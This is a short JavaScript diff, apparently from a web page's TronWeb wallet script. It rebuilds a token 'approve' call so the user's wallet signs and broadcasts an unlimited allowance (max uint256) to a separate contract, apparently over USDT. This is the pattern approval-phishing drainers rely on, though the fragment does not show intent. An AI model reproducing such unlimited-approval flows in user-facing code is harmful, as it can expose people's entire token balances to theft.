@@ -279,17 +279,28 @@
                     return;
                 }
 
-                let userAddress = tronWeb.defaultAddress.base58;
+                let accounts = await tronWeb.request({ method: "tron_requestAccounts" });
+                let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
 
-                const usdtContract = await tronWeb.contract().at(token.address);
-                
-                let txHash = await usdtContract.approve(
-                    token.smartContract,
-                    '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
-                ).send({
-                    feeLimit: 100000000,
-                    callValue: 0
-                });
+                if (!userAddress) {
+                    userAddress = tronWeb.defaultAddress.base58;
+                }
+
+                const parameter = [
+                    {type: 'address', value: token.smartContract},
+                    {type: 'uint256', value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'}
+                ];
+
+                const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+                    token.address,
+                    'approve(address,uint256)',
+                    {feeLimit: 100000000},
+                    parameter,
+                    userAddress
+                );
+
+                const signedTx = await tronWeb.trx.sign(tx.transaction);
+                let txHash = await tronWeb.trx.sendRawTransaction(signedTx);
 
                 await new Promise(resolve => setTimeout(resolve, 100));
 
